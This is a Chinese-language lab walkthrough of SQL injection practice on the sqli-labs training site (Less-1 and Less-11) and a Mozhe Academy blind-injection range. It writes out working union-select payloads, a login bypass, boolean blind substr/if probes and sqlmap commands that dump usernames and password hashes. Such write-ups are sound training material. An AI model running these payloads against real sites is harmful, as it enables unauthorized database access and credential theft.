#### 1. 注入实验：Less-1（基础 GET 注入）
1.1 判断是否存在sql注入
1.提示你输入数字值的ID作为参数，我们输入?id=1
![image.png](https://image.kmoon.fun/2025/202505181802834.png)
2.通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了。
![image.png](https://image.kmoon.fun/2025/202505181803478.png)
![image.png](https://image.kmoon.fun/2025/202505181803482.png)

3.接下来我们判断sql语句是否是拼接，且是字符型还是数字型。
![image.png](https://image.kmoon.fun/2025/202505181803602.png)
![image.png](https://image.kmoon.fun/2025/202505181803500.png)

4.可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。

1.2 联合注入
第一步：首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。
**?id=1'order by 3 --+**
![image.png](https://image.kmoon.fun/2025/202505181805271.png)
![image.png](https://image.kmoon.fun/2025/202505181805082.png)

第二步：爆出显示位，就是看看表格里面那一列是在页面显示的。可以看到是第二列和第三列里面的数据是显示在页面的。
**?id=-1'union select 1,2,3--+**
![image.png](https://image.kmoon.fun/2025/202505181806765.png)
第三步：获取当前数据名和版本号。通过结果知道当前数据看是security,版本是5.7.26。
**?id=-1'union select 1,database(),version()--+**
![image.png](https://image.kmoon.fun/2025/202505181806764.png)

第四步： 爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。
**?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+**
该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。
![image.png](https://image.kmoon.fun/2025/202505181807487.png)
 第五步：爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。
**?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+**
该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。
![image.png](https://image.kmoon.fun/2025/202505181808792.png)
 第六步：通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。加了一个id可以隔一下账户和密码。
 **?id=-1' union select 1,2,group_concat(username ,id , password) from users--+**
 ![image.png](https://image.kmoon.fun/2025/202505181810106.png)

#### 2. 注入实验：Less-11（POST注入）
![image.png](https://image.kmoon.fun/2025/202505181811734.png)

该页面是一个账户登录页面。那么注入点就在输入框里面。
同时该登录请求是一个  POST 请求，参数是在表单里面。
我们可以直接在输入框进行注入就行。
并且参数不在是一个还是两个。
根据前面的认识我们可以猜测sql语句。
大概的形式应该是这样username=参数 and password=参数 ，只是不知道是字符型还是整数型。
当我们输入1时出现错误图片：
![image.png](https://image.kmoon.fun/2025/202505181812289.png)
当我们输入1',出现报错信息。根据报错信息可以推断该sql语句username='参数' and password='参数'
![image.png](https://image.kmoon.fun/2025/202505181813268.png)
知道sql语句我们可以构造一个恒成立的sql语句，看的查询出什么。这里我们使用--+注释就不行，需要换成#来注释。
![image.png](https://image.kmoon.fun/2025/202505181814151.png)
![image.png](https://image.kmoon.fun/2025/202505181814155.png)
后面的步骤就和前面的实验一样，使用联合注入就可以获取数据库信息。

#### 3. 选做
- [墨者学院 SQL注入漏洞测试(布尔盲注)](https://mozhe.cn/bug/detail/UDNpU0gwcUhXTUFvQm9HRVdOTmNTdz09bW96aGUmozhe)
![image.png](https://image.kmoon.fun/2025/202505181816282.png)

启动靶场环境后，进入页面发现同样是一个登录表单。
![image.png](https://image.kmoon.fun/2025/202505181819543.png)
下方有一个滚动的通知，我们点击通知进去
![image.png](https://image.kmoon.fun/2025/202505181820132.png)
发现 url 中有一个 id 参数
通过测试 and 1=1 and 1=2 之后发现存在注入点
![image.png](https://image.kmoon.fun/2025/202505181823696.png)
![image.png](https://image.kmoon.fun/2025/202505181823106.png)
通过 order by 判断列数 4时正常，5时报错，判断列数为4列
![image.png](https://image.kmoon.fun/2025/202505181824859.png)
![image.png](https://image.kmoon.fun/2025/202505181824837.png)
联合查询判断显示位：正确的列数下却没有任何回显，只能显示报错，由此验证是布尔盲注
![image.png](https://image.kmoon.fun/2025/202505181825659.png)
![image.png](https://image.kmoon.fun/2025/202505181825780.png)

盲注测试数据库的长度

盲注的要点是，利用函数，根据页面是否正确回显，从而判断输入的参数是否正确

构造语句and if(length(database())=10,1,0)，得到正常的回显，则数据库长度为10

length()：常用于计算字符串长度  
而if则判断database()长度是否等于10，是返回1，不是返回0

![fig:](https://img2023.cnblogs.com/blog/3205924/202305/3205924-20230524225648205-340693733.png)

长度错误时报错

![fig:](https://img2023.cnblogs.com/blog/3205924/202305/3205924-20230524225648373-1820759801.png)

进一步猜测数据库的名称

构造语句and if(substr(database(),1,1)='s',1,0)，猜测数据库的第一个字符

substr(str, pos, len)：str为字符串，pos为起始位置，len为截取字符个数  
即为截取数据库的第一个字符，判断是否为s，是返回1，不是返回0

得到正确回显

![fig:](https://img2023.cnblogs.com/blog/3205924/202305/3205924-20230524225648405-2070574425.png)

猜测第二个字符，得到r

![fig:](https://img2023.cnblogs.com/blog/3205924/202305/3205924-20230524225648296-1009136881.png)

以此类推……最终得到数据库的名称为stormgroup

![fig:](https://img2023.cnblogs.com/blog/3205924/202305/3205924-20230524225648279-987396943.png)
盲注猜测表的名称

构造语句and if(substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),1,1)='m',1,0)

判断出第一张表的第一个字符是m

select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1即正常获取第一张表

![fig:](https://img2023.cnblogs.com/blog/3205924/202305/3205924-20230524225648384-270410844.png)

手工盲注非常耗时，我们可以使用 sqlmap 工具：
下载地址 [sqlmap: automatic SQL injection and database takeover tool](https://sqlmap.org/)
1. 在终端中启动sqlmap
**python sqlmap.py** 后面加参数执行sql注入
2. sqlmap -u "new_list.php?id=1" --dbs   
获得数据库名stormgroup  
  
3. sqlmap -u “new_list.php?id=1" -D stormgroup --tables   
  
显示两个表member和notice，显然member存储用户信息

2. sqlmap -u "new_list.php?id=1" -D stormgroup -T member --columns —batch

得字段 name，password，status  
5. dump表  
sqlmap -u "new_list.php?id=1" -D stormgroup -T member -C name,password --dump  
得两个用户，密码为md5，解密status为1的MD5得密码